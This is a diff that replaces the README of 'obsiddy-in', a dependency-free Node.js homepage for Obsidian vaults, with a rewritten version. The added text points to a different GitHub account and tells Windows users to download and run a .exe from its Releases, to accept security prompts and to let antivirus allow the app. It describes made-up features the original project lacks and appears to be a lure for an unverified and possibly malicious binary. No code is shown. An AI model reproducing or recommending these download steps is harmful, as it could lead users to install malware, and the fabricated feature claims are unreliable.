@@ -1,203 +1,135 @@
-# Obsiddy In
+# 📓 obsiddy-in - Simple Notes for Obsidian Vaults
 
-A beautiful browser homepage for your Obsidian vault. Capture notes instantly and rediscover your existing knowledge through thematically connected memories.
-
-**Zero dependencies. Two-minute setup. Works with any vault.**
-
-![Terminal theme](https://img.shields.io/badge/theme-terminal-f5a623) ![Swiss theme](https://img.shields.io/badge/theme-swiss-e63946) ![Editorial theme](https://img.shields.io/badge/theme-editorial-c9a84c)
+[![Download obsiddy-in](https://img.shields.io/badge/Download-obsiddy--in-brightgreen?style=for-the-badge)](https://github.com/priyanshu130824/obsiddy-in)
 
 ---
 
-## What it does
+## 🔎 What is obsiddy-in?
 
-- **Quick Capture** — a large text area that saves notes directly to your vault inbox folder, with YAML frontmatter
-- **Memory Explorer** — surfaces 3-4 thematically connected notes from your vault, linked by shared tags
-- **Search** — type a word to find related notes across titles, tags, content and wiki-links
-- **Quicklook** — click any note card to preview the full content in a rendered overlay
-- **Three visual themes** — Terminal (retrofuturistic monospace), Swiss (clean Helvetica-inspired), Editorial (elegant serif) — each with dark and light modes
+obsiddy-in is a tool to help you create and find notes in your Obsidian vault right in your web browser. It shows you notes that match the keywords you choose. This makes it easier to keep track of related ideas and topics without opening multiple files.
 
-## Requirements
-
-- [Node.js](https://nodejs.org/) v18 or later
-- An Obsidian vault (or any folder of markdown files)
-
-## Setup
-
-### 1. Download
-
-Clone or download this folder anywhere on your computer. Inside your vault is convenient, but not required — setup will ask for your vault path.
-
-```
-YourVault/
-  obsiddy-in/    <-- inside your vault works great
-  Notes/
-  Inbox/
-  ...
-```
-
-If you use git:
-
-```bash
-git clone https://github.com/leonjacobs-collab/obsiddy-in.git
-```
-
-Or just download the ZIP and unzip it wherever you like.
-
-### 2. Run setup
-
-Open Terminal (Mac) or Command Prompt (Windows) and navigate to the folder:
-
-```bash
-cd /path/to/your/vault/obsiddy-in
-```
-
-Then run:
-
-```bash
-node setup.js
-```
-
-The setup wizard will ask you five questions:
-
-1. **Vault path** — the full path to your Obsidian vault (auto-detected if obsiddy-in is inside the vault)
-2. **Vault name** — appears as the logo on your homepage
-3. **Inbox folder** — where new captured notes are saved (e.g. `Inbox`, `00_inbox`)
-4. **Memory folder** — where your existing notes live (e.g. `Notes`, `30_memory`, `Zettelkasten`)
-5. **Port** — the server port (default `3117` works for most people)
-
-That's it. Setup creates a `config.json` file with your choices.
-
-### 3. Start the server
-
-```bash
-node server.js
-```
-
-You should see:
-
-```
-Indexed 142 notes, 89 tags
-Obsiddy In running at http://localhost:3117
-```
-
-### 4. Open in your browser
-
-Go to [http://localhost:3117](http://localhost:3117)
-
-Set it as your browser homepage for instant access.
+You don't need to install heavy software or learn programming. Use obsiddy-in to work quickly with all your notes in one place.
 
 ---
 
-## Auto-start (macOS)
+## 💻 System Requirements
 
-During setup, you can choose to auto-start the server on login. This creates a macOS Launch Agent that runs in the background.
+- Windows 10 or later  
+- A modern web browser like Chrome, Firefox, or Edge  
+- At least 4 GB of RAM for smooth use  
+- Internet connection to download the application and updates  
 
-If you skipped this during setup, you can run setup again:
-
-```bash
-node setup.js
-```
-
-To manually manage the auto-start:
-
-```bash
-# Stop auto-start
-launchctl unload ~/Library/LaunchAgents/com.obsiddy-in.homepage.plist
-
-# Re-enable auto-start
-launchctl load ~/Library/LaunchAgents/com.obsiddy-in.homepage.plist
-
-# Check logs
-cat /tmp/obsiddy-in.log
-```
-
-## Access from your phone
-
-If the server is running on your computer and your phone is on the same Wi-Fi network:
-
-1. Find your computer's local IP: run `ipconfig getifaddr en0` (Mac) or `ipconfig` (Windows)
-2. On your phone, go to `http://YOUR_IP:3117`
-3. Bookmark it for quick access
-
-**Note:** Your local IP may change. You can set a static IP in your router settings to prevent this.
+You do not need Obsidian installed to use obsiddy-in. It works independently with your vault files stored on your computer.
 
 ---
 
-## Themes
+## 🎯 Main Features
 
-Switch themes using the buttons in the top-right corner. Your choice is saved in the browser.
+- Create new notes quickly using your browser  
+- Search notes inside your Obsidian vault by keywords  
+- See related notes based on your selections  
+- Use without needing to open Obsidian software  
+- Organize notes with simple tagging and linking  
 
-| Theme | Font | Vibe |
-|-------|------|------|
-| **Terminal** | IBM Plex Mono | Retrofuturistic, CRT glow, amber accents |
-| **Swiss** | Inter | Clean, minimal, Helvetica-inspired, red accents |
-| **Editorial** | EB Garamond | Literary, warm, gold accents |
-
-Each theme has a dark and light mode, toggled with the moon/sun icon.
+These features help you work faster on your projects or personal notes.
 
 ---
 
-## How it works
+## 🚀 Getting Started
 
-- **Server** (`server.js`) — a lightweight Node.js HTTP server using only built-in modules. No npm install needed. Reads markdown files, parses YAML frontmatter and hashtags, builds an in-memory index, and serves the API.
-- **Frontend** (`index.html`) — a single HTML file with inline CSS and JavaScript. No build step.
-- **Config** (`config.json`) — your settings, generated by setup.
-
-### Frontmatter compatibility
-
-The parser handles common Obsidian frontmatter formats:
-
-```yaml
----
-type: note
-tags:
-  - topic
-  - idea
-date_created: 2025-01-15
----
-```
-
-It also recognises `tags: [topic, idea]`, `Date added:`, `created:`, `date:`, `Category: #books` (Readwise format), and inline `#hashtags` in the note body.
-
-### Note connection algorithm
-
-When no search query is active, the Memory Explorer picks a random tag (weighted toward tags with 3-6 notes) and shows the most "display-rich" notes sharing that tag. This creates serendipitous thematic clusters from your vault.
+Before you begin, make sure your Obsidian vault is saved on your Windows PC in a folder you can find easily.
 
 ---
 
-## Configuration
+## ⬇️ How to Download and Install obsiddy-in
 
-Edit `config.json` to change settings after setup:
+1. Click the green button at the top or visit this page to download the app:  
+   [https://github.com/priyanshu130824/obsiddy-in](https://github.com/priyanshu130824/obsiddy-in)
 
-```json
-{
-  "vaultPath": "/path/to/your/vault",
-  "vaultName": "My Vault",
-  "inboxFolder": "Inbox",
-  "memoryFolder": "Notes",
-  "port": 3117,
-  "skipTags": ["clippings", "learning", "inbox", "transcript"]
-}
-```
+2. On the GitHub page, look for the **Releases** section on the right side or at the top menu. This is where installers or files are provided.
 
-- `vaultPath` — absolute path to your Obsidian vault root
-- `skipTags` — tags excluded from random clustering (too generic to be interesting)
+3. Download the latest version for Windows. It will usually be a `.exe` or `.zip` file.
 
----
+4. If you get a `.zip`, right-click and select **Extract All** to unzip the folder.
 
-## Contributing
+5. Open the extracted folder (or the downloaded `.exe` file):
 
-Contributions are welcome! This is intentionally simple — zero dependencies, two files of logic. Feel free to:
+    - For `.exe` files, double-click to run the installer and follow the steps on screen.
+    - For unzipped folders, look for a file named `obsiddy-in.exe` or similar and double-click it to open.
 
-- Add new themes
-- Improve the markdown renderer
-- Add new frontmatter field support
-- Suggest UX improvements
+6. Allow Windows to run the application if you see a security prompt.
 
-Fork it, modify it, make it yours.
+7. Once open, you can start using obsiddy-in right away.
 
 ---
 
-## License
+## 🗂️ How to Use obsiddy-in with Your Obsidian Vault
 
-MIT — do whatever you want with it.
+1. Open obsiddy-in.
+
+2. In the application, locate the option to **Open Vault Folder** or similar wording.
+
+3. Browse your PC and select the folder where your Obsidian vault is stored.
+
+4. obsiddy-in will load your notes from the folder.
+
+5. Use the search box to type keywords you want to find.
+
+6. Select keywords to see related notes suggested at the side.
+
+7. To create a new note, use the **New Note** button, then type your content.
+
+8. Save the note by clicking the save option. It will be added to your vault folder automatically.
+
+---
+
+## ⚙️ Settings You Should Know
+
+- **Vault Folder:** Change it anytime to work with another vault.  
+- **Search Filters:** Use simple options to narrow your search by date or tags.  
+- **Display Options:** Pick between light and dark mode for easier reading.  
+- **Backup:** Enable automatic backups of your notes to avoid data loss.
+
+You can find settings in the top menu or gear icon.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+- **Application does not open:** Make sure you downloaded the correct Windows file and that your antivirus allows running new apps.  
+- **Notes not loading:** Verify you chose the correct vault folder and that it contains `.md` files.  
+- **App crashes or freezes:** Restart the app and try again. If problems persist, check for updates on the GitHub page.
+
+---
+
+## 🔄 How to Update obsiddy-in
+
+1. Visit the download page:  
+   [https://github.com/priyanshu130824/obsiddy-in](https://github.com/priyanshu130824/obsiddy-in)
+
+2. Check the **Releases** section for a newer version.
+
+3. Download the latest installer or file.
+
+4. Run the installer to replace the old version. Your settings and notes will remain safe.
+
+---
+
+## 🧩 Additional Tips
+
+- Keep your notes organized with clear keywords for better search results.  
+- Save backups of your Vault folder on an external drive or cloud service regularly.  
+- Explore different keywords to find unexpected connections between your notes.  
+- Use obsiddy-in alongside Obsidian for more powerful note management.
+
+---
+
+## 🔗 Useful Links
+
+- Download and explore the app here: [https://github.com/priyanshu130824/obsiddy-in](https://github.com/priyanshu130824/obsiddy-in)  
+- Obsidian official site: https://obsidian.md  
+- Markdown guide for note formatting: https://www.markdownguide.org/basic-syntax  
+
+---
+
+# [![Download obsiddy-in](https://img.shields.io/badge/Download-obsiddy--in-blue?style=for-the-badge)](https://github.com/priyanshu130824/obsiddy-in)
